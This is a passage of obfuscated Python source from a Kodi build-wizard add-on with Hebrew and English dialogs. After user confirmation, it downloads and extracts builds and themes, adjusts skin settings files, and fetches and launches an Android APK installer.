				wiz .setS ('installed','true')#line:3803
				wiz .setS ('extract',str (OOOOO0O0000O0OO00 ))#line:3804
				wiz .setS ('errors',str (OO00OO0O00OOO00OO ))#line:3805
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOO0O0000O0OO00 ,OO00OO0O00OOO00OO ))#line:3806
				OO00O0OOO0O0OOO00 =(ADDON .getSetting ("gaiaseren"))#line:3808
				if OO00O0OOO0O0OOO00 =='true':#line:3809
					wiz .kodi17Fix ()#line:3810
				fastupdatefirstbuild (NOTEID )#line:3811
				skin_homeselect ()#line:3812
				skin_lower ()#line:3813
				rdbuildinstall ()#line:3814
				try :gaiaserenaddon ()#line:3816
				except :pass #line:3817
				adults18 ()#line:3818
				skinfix18 ()#line:3819
				try :os .remove (OO000OO00O000OOO0 )#line:3821
				except :pass #line:3822
				if OO00O0OOO0O0OOO00 =='true':#line:3824
					wiz .kodi17Fix ()#line:3825
				if int (float (OO00OO0O00OOO00OO ))>0 :#line:3827
					OO0O0OO000OO0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOO0O0000O0OO00 ,'%',COLOR1 ,OO00OO0O00OOO00OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3828
					if OO0O0OO000OO0OO00 :#line:3829
						if isinstance (OO00OO0O00OOO00OO ,unicode ):#line:3830
							O0OOO0O00O000O00O =O0OOO0O00O000O00O .encode ('utf-8')#line:3831
						wiz .TextBox (ADDONTITLE ,O0OOO0O00O000O00O )#line:3832
				DP .close ()#line:3833
				O0O0000OO0O00OO00 =wiz .themeCount (OO0O0O0O000O0OOOO )#line:3834
				indicator ()#line:3835
				if not O0O0000OO0O00OO00 ==False :#line:3836
					buildWizard (OO0O0O0O000O0OOOO ,'theme')#line:3837
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3838
				if INSTALLMETHOD ==1 :OOO0OO0OOOOO00O0O =1 #line:3839
				elif INSTALLMETHOD ==2 :OOO0OO0OOOOO00O0O =0 #line:3840
				else :resetkodi ()#line:3841
				if OOO0OO0OOOOO00O0O ==1 :wiz .reloadFix ()#line:3843
				else :wiz .killxbmc (True )#line:3844
			else :#line:3845
				if isinstance (OO00OO0O00OOO00OO ,unicode ):#line:3846
					O0OOO0O00O000O00O =O0OOO0O00O000O00O .encode ('utf-8')#line:3847
				O000O0O000000O0O0 =open (OO000OO00O000OOO0 ,'r')#line:3848
				OOOOO0O0OOO0O0000 =O000O0O000000O0O0 .read ()#line:3849
				OO00OOO00OOOOO0O0 =''#line:3850
				for O00000O0O0OO0000O in OOOOOOO0O0000OOOO :#line:3851
				  OO00OOO00OOOOO0O0 ='key: '+OO00OOO00OOOOO0O0 +'\n'+O00000O0O0OO0000O #line:3852
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0OOO0O00O000O00O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00OOO00OOOOO0O0 )#line:3853
		else :#line:3854
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3855
	elif O00OO00000000O0O0 =='theme':#line:3856
		if theme ==None :#line:3857
			O0O0000OO0O00OO00 =wiz .checkBuild (OO0O0O0O000O0OOOO ,'theme')#line:3858
			OO00O00000O0OO0O0 =[]#line:3859
			if not O0O0000OO0O00OO00 =='http://'and wiz .workingURL (O0O0000OO0O00OO00 )==True :#line:3860
				OO00O00000O0OO0O0 =wiz .themeCount (OO0O0O0O000O0OOOO ,False )#line:3861
				if len (OO00O00000O0OO0O0 )>0 :#line:3862
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ,COLOR1 ,len (OO00O00000O0OO0O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3863
						wiz .log ("Theme List: %s "%str (OO00O00000O0OO0O0 ))#line:3864
						OO0O00OOOO00O00O0 =DIALOG .select (ADDONTITLE ,OO00O00000O0OO0O0 )#line:3865
						wiz .log ("Theme install selected: %s"%OO0O00OOOO00O00O0 )#line:3866
						if not OO0O00OOOO00O00O0 ==-1 :theme =OO00O00000O0OO0O0 [OO0O00OOOO00O00O0 ];OO000OOO0OO0O0000 =True #line:3867
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3868
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3869
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3870
		else :OO000OOO0OO0O0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0O0O0O000O0OOOO ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3871
		if OO000OOO0OO0O0000 :#line:3872
			OOOO000O0O0OO000O =wiz .checkTheme (OO0O0O0O000O0OOOO ,theme ,'url')#line:3873
			O0OO0O0O00OOO000O =OO0O0O0O000O0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3874
			if not wiz .workingURL (OOOO000O0O0OO000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3875
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3876
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3877
			OO000OO00O000OOO0 =os .path .join (PACKAGES ,'%s.zip'%O0OO0O0O00OOO000O )#line:3878
			try :os .remove (OO000OO00O000OOO0 )#line:3879
			except :pass #line:3880
			downloader .download (OOOO000O0O0OO000O ,OO000OO00O000OOO0 ,DP )#line:3881
			xbmc .sleep (1000 )#line:3882
			DP .update (0 ,"","Installing %s "%OO0O0O0O000O0OOOO )#line:3883
			OO0OO0OOO0OOOOO0O =False #line:3884
			if url not in ["fresh","normal"]:#line:3885
				OO0OO0OOO0OOOOO0O =testTheme (OO000OO00O000OOO0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3886
				OOOOOO0O0OOO0O00O =testGui (OO000OO00O000OOO0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3887
				if OO0OO0OOO0OOOOO0O ==True :#line:3888
					wiz .lookandFeelData ('save')#line:3889
					O00OO00OO000000OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3890
					OOO0O00O00O0O00OO =xbmc .getSkinDir ()#line:3891
					skinSwitch .swapSkins (O00OO00OO000000OO )#line:3893
					O0O0O00OOOO0O0O00 =0 #line:3894
					xbmc .sleep (1000 )#line:3895
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OOOO0O0O00 <150 :#line:3896
						O0O0O00OOOO0O0O00 +=1 #line:3897
						xbmc .sleep (1000 )#line:3898
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3899
						wiz .ebi ('SendClick(11)')#line:3900
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3901
					xbmc .sleep (1000 )#line:3902
			O00O0O0O000O00000 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3903
			DP .update (0 ,O00O0O0O000O00000 ,'','אנא המתן')#line:3904
			OOOOO0O0000O0OO00 ,OO00OO0O00OOO00OO ,O0OOO0O00O000O00O =extract .all (OO000OO00O000OOO0 ,HOME ,DP ,title =O00O0O0O000O00000 )#line:3905
			wiz .setS ('buildtheme',theme )#line:3906
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOOO0O0000O0OO00 ,OO00OO0O00OOO00OO ))#line:3907
			DP .close ()#line:3908
			if url not in ["fresh","normal"]:#line:3909
				wiz .forceUpdate ()#line:3910
				if KODIV >=17 :wiz .kodi17Fix ()#line:3911
				if OOOOOO0O0OOO0O00O ==True :#line:3912
					wiz .lookandFeelData ('save')#line:3913
					wiz .defaultSkin ()#line:3914
					OOO0O00O00O0O00OO =wiz .getS ('defaultskin')#line:3915
					skinSwitch .swapSkins (OOO0O00O00O0O00OO )#line:3916
					O0O0O00OOOO0O0O00 =0 #line:3917
					xbmc .sleep (1000 )#line:3918
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OOOO0O0O00 <150 :#line:3919
						O0O0O00OOOO0O0O00 +=1 #line:3920
						xbmc .sleep (1000 )#line:3921
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3923
						wiz .ebi ('SendClick(11)')#line:3924
					wiz .lookandFeelData ('restore')#line:3925
				elif OO0OO0OOO0OOOOO0O ==True :#line:3926
					skinSwitch .swapSkins (OOO0O00O00O0O00OO )#line:3927
					O0O0O00OOOO0O0O00 =0 #line:3928
					xbmc .sleep (1000 )#line:3929
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OOOO0O0O00 <150 :#line:3930
						O0O0O00OOOO0O0O00 +=1 #line:3931
						xbmc .sleep (1000 )#line:3932
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3934
						wiz .ebi ('SendClick(11)')#line:3935
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3936
					wiz .lookandFeelData ('restore')#line:3937
				else :#line:3938
					wiz .ebi ("ReloadSkin()")#line:3939
					xbmc .sleep (1000 )#line:3940
					wiz .ebi ("Container.Refresh")#line:3941
		else :#line:3942
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3943
def skin_homeselect ():#line:3947
	try :#line:3949
		O0O0000000000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3950
		OO0O00O00OO0O00OO =open (O0O0000000000000O ,'r')#line:3952
		OOOOO0O0O00O0O0O0 =OO0O00O00OO0O00OO .read ()#line:3953
		OO0O00O00OO0O00OO .close ()#line:3954
		OO0O0OO00OOO000OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:3955
		OO000O0O0O00OO000 =re .compile (OO0O0OO00OOO000OO ).findall (OOOOO0O0O00O0O0O0 )[0 ]#line:3956
		OO0O00O00OO0O00OO =open (O0O0000000000000O ,'w')#line:3957
		OO0O00O00OO0O00OO .write (OOOOO0O0O00O0O0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%OO000O0O0O00OO000 ,'<setting id="HomeS" type="string"></setting>'))#line:3958
		OO0O00O00OO0O00OO .close ()#line:3959
	except :#line:3960
		pass #line:3961
def skin_lower ():#line:3964
	OO000OOO0O0O0O0O0 =(ADDON .getSetting ("lower"))#line:3965
	if OO000OOO0O0O0O0O0 =='true':#line:3966
		try :#line:3969
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3970
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:3972
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:3973
			O0OOOO00OO00OOO00 .close ()#line:3974
			OO0000O00OO0O0O00 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3975
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:3976
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:3977
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3978
			O0OOOO00OO00OOO00 .close ()#line:3979
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3981
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:3983
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:3984
			O0OOOO00OO00OOO00 .close ()#line:3985
			OO0000O00OO0O0O00 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3986
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:3987
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:3988
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3989
			O0OOOO00OO00OOO00 .close ()#line:3990
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3992
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:3994
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:3995
			O0OOOO00OO00OOO00 .close ()#line:3996
			OO0000O00OO0O0O00 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3997
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:3998
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:3999
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4000
			O0OOOO00OO00OOO00 .close ()#line:4001
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4005
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:4007
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:4008
			O0OOOO00OO00OOO00 .close ()#line:4009
			OO0000O00OO0O0O00 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4010
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:4011
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:4012
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4013
			O0OOOO00OO00OOO00 .close ()#line:4014
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4018
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:4020
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:4021
			O0OOOO00OO00OOO00 .close ()#line:4022
			OO0000O00OO0O0O00 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4023
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:4024
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:4025
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4026
			O0OOOO00OO00OOO00 .close ()#line:4027
			O0O0O0O0OO000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4031
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'r')#line:4033
			OO0OOOO0O000OOO0O =O0OOOO00OO00OOO00 .read ()#line:4034
			O0OOOO00OO00OOO00 .close ()#line:4035
			OO0000O00OO0O0O00 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4036
			OO0000O000O0O0OOO =re .compile (OO0000O00OO0O0O00 ).findall (OO0OOOO0O000OOO0O )[0 ]#line:4037
			O0OOOO00OO00OOO00 =open (O0O0O0O0OO000OO00 ,'w')#line:4038
			O0OOOO00OO00OOO00 .write (OO0OOOO0O000OOO0O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO0000O000O0O0OOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4039
			O0OOOO00OO00OOO00 .close ()#line:4040
		except :#line:4045
			pass #line:4046
def thirdPartyInstall (OOO0OO0O00O0O000O ,O0OOOO00OOOOO00OO ):#line:4048
	if not wiz .workingURL (O0OOOO00OOOOO00OO ):#line:4049
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4050
	O0O00OOO00OO0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0O00O0O000O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4051
	if O0O00OOO00OO0000O ==1 :#line:4052
		freshStart ('third',True )#line:4053
	wiz .clearS ('build')#line:4054
	O00OOOOO0OOO0000O =OOO0OO0O00O0O000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4055
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4056
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0O00O0O000O ),'','אנא המתן')#line:4057
	O00O00OOO0O0OO00O =os .path .join (PACKAGES ,'%s.zip'%O00OOOOO0OOO0000O )#line:4058
	try :os .remove (O00O00OOO0O0OO00O )#line:4059
	except :pass #line:4060
	downloader .download (O0OOOO00OOOOO00OO ,O00O00OOO0O0OO00O ,DP )#line:4061
	xbmc .sleep (1000 )#line:4062
	OOOOOO0O0O0OOO0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0O00O0O000O )#line:4063
	DP .update (0 ,OOOOOO0O0O0OOO0O0 ,'','אנא המתן')#line:4064
	O0OOO0000OOO00000 ,OOO0OOO000O0O0O0O ,O0OO00000O000OOO0 =extract .all (O00O00OOO0O0OO00O ,HOME ,DP ,title =OOOOOO0O0O0OOO0O0 )#line:4065
	if int (float (O0OOO0000OOO00000 ))>0 :#line:4066
		wiz .fixmetas ()#line:4067
		wiz .lookandFeelData ('save')#line:4068
		wiz .defaultSkin ()#line:4069
		wiz .setS ('installed','true')#line:4071
		wiz .setS ('extract',str (O0OOO0000OOO00000 ))#line:4072
		wiz .setS ('errors',str (OOO0OOO000O0O0O0O ))#line:4073
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOO0000OOO00000 ,OOO0OOO000O0O0O0O ))#line:4074
		try :os .remove (O00O00OOO0O0OO00O )#line:4075
		except :pass #line:4076
		if int (float (OOO0OOO000O0O0O0O ))>0 :#line:4077
			OO00000O000O00OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0O00O0O000O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OOO0000OOO00000 ,'%',COLOR1 ,OOO0OOO000O0O0O0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4078
			if OO00000O000O00OO0 :#line:4079
				if isinstance (OOO0OOO000O0O0O0O ,unicode ):#line:4080
					O0OO00000O000OOO0 =O0OO00000O000OOO0 .encode ('utf-8')#line:4081
				wiz .TextBox (ADDONTITLE ,O0OO00000O000OOO0 )#line:4082
	DP .close ()#line:4083
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4084
	if INSTALLMETHOD ==1 :O0OO00O00OOO0O0OO =1 #line:4085
	elif INSTALLMETHOD ==2 :O0OO00O00OOO0O0OO =0 #line:4086
	else :O0OO00O00OOO0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4087
	if O0OO00O00OOO0O0OO ==1 :wiz .reloadFix ()#line:4088
	else :wiz .killxbmc (True )#line:4089
def testTheme (O0O00000O0O0OO0O0 ):#line:4091
	OOO00O00O00OOO000 =zipfile .ZipFile (O0O00000O0O0OO0O0 )#line:4092
	for O00000OO000OO0O0O in OOO00O00O00OOO000 .infolist ():#line:4093
		if '/settings.xml'in O00000OO000OO0O0O .filename :#line:4094
			return True #line:4095
	return False #line:4096
def testGui (O0O0OOOOO0O000OO0 ):#line:4098
	O0O0OO00OO0OO0OO0 =zipfile .ZipFile (O0O0OOOOO0O000OO0 )#line:4099
	for OOO00O000O0O00OO0 in O0O0OO00OO0OO0OO0 .infolist ():#line:4100
		if '/guisettings.xml'in OOO00O000O0O00OO0 .filename :#line:4101
			return True #line:4102
	return False #line:4103
def apkInstaller (OO000O00OOOO0O00O ,OO0OO000OO00O0OO0 ):#line:4105
	wiz .log (OO000O00OOOO0O00O )#line:4106
	wiz .log (OO0OO000OO00O0OO0 )#line:4107
	if wiz .platform ()=='android':#line:4108
		O0000OO0O00OOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00OOOO0O00O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4109
		if not O0000OO0O00OOO000 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4110
		OOO0O0O00OO0000O0 =OO000O00OOOO0O00O #line:4111
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4112
		if not wiz .workingURL (OO0OO000OO00O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4113
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0O00OO0000O0 ),'','אנא המתן')#line:4114
		O0O0000OOO0OOO0O0 =os .path .join (PACKAGES ,"%s.apk"%OO000O00OOOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4115
		try :os .remove (O0O0000OOO0OOO0O0 )#line:4116
		except :pass #line:4117
		downloader .download (OO0OO000OO00O0OO0 ,O0O0000OOO0OOO0O0 ,DP )#line:4118
		xbmc .sleep (100 )#line:4119
		DP .close ()#line:4120
		notify .apkInstaller (OO000O00OOOO0O00O )#line:4121
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O0000OOO0OOO0O0 +'")')#line:4122
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4123
def createMenu (O000OOO0O00O0OO00 ,OOOOO0OO00O00OO00 ,OOO00O00OO00OOO0O ):#line:4129
	if O000OOO0O00O0OO00 =='saveaddon':#line:4130
		OO0OO00OO000OOO00 =[]#line:4131
		OO00O00O0O0OO0OO0 =urllib .quote_plus (OOOOO0OO00O00OO00 .lower ().replace (' ',''))#line:4132
		O0000OOO000O0O000 =OOOOO0OO00O00OO00 .replace ('Debrid','Real Debrid')#line:4133
		OOO000O00OOOO0O00 =urllib .quote_plus (OOO00O00OO00OOO0O .lower ().replace (' ',''))#line:4134
		OOO00O00OO00OOO0O =OOO00O00OO00OOO0O .replace ('url','URL Resolver')#line:4135
		OO0OO00OO000OOO00 .append ((THEME2 %OOO00O00OO00OOO0O .title (),' '))#line:4136
		OO0OO00OO000OOO00 .append ((THEME3 %'Save %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4137
		OO0OO00OO000OOO00 .append ((THEME3 %'Restore %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4138
		OO0OO00OO000OOO00 .append ((THEME3 %'Clear %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4139
	elif O000OOO0O00O0OO00 =='save':#line:4140
		OO0OO00OO000OOO00 =[]#line:4141
		OO00O00O0O0OO0OO0 =urllib .quote_plus (OOOOO0OO00O00OO00 .lower ().replace (' ',''))#line:4142
		O0000OOO000O0O000 =OOOOO0OO00O00OO00 .replace ('Debrid','Real Debrid')#line:4143
		OOO000O00OOOO0O00 =urllib .quote_plus (OOO00O00OO00OOO0O .lower ().replace (' ',''))#line:4144
		OOO00O00OO00OOO0O =OOO00O00OO00OOO0O .replace ('url','URL Resolver')#line:4145
		OO0OO00OO000OOO00 .append ((THEME2 %OOO00O00OO00OOO0O .title (),' '))#line:4146
		OO0OO00OO000OOO00 .append ((THEME3 %'Register %s'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4147
		OO0OO00OO000OOO00 .append ((THEME3 %'Save %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4148
		OO0OO00OO000OOO00 .append ((THEME3 %'Restore %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4149
		OO0OO00OO000OOO00 .append ((THEME3 %'Import %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4150
